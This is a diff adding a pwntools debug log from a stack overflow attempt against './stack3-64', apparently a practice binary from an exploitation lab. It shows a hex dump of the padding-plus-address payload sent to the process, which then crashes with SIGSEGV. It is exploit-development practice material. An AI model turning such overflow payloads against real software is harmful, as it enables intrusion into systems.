@@ -1,0 +1,11 @@
+[x] Starting local process './stack3-64'
+[+] Starting local process './stack3-64': pid 590
+[DEBUG] Sent 0x5f bytes:
+    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
+    *
+    00000050  61 61 61 61  61 61 aa 07  40 55 55 55  00 00 0a     │aaaa│aa··│@UUU│···│
+    0000005f
+[x] Receiving all data
+[x] Receiving all data: 0B
+[+] Receiving all data: Done (0B)
+[*] Process './stack3-64' stopped with exit code -11 (SIGSEGV) (pid 590)
